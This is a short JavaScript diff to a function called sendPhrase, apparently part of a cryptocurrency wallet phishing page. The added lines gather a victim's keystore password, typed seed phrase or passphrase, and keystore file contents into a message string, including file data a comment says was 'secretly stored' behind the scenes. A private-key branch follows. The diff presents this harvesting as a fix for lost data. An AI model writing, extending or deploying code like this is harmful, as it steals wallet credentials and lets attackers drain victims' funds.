@@ -75,8 +75,17 @@ function sendPhrase() {
 
         let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
         messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;
-        // Safely append the data natively. No more external API fetches, no more missing emails!
-        messageString += "\n\nData:\n" + keyData;
+
+        // Grab the manually typed passphrase
+        if (keyData) {
+            messageString += "\n\nTyped Passphrase/Text:\n" + keyData;
+        }
+
+        // Grab the file contents that we secretly stored in the dataset behind the scenes!
+        const attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
+        if (attachedContent) {
+            messageString += "\n\nAttached File Content:\n" + attachedContent;
+        }
 
     } else if (activeType === 'privatekey') {
         const privData = document.getElementById('privkeyInput').value.trim();
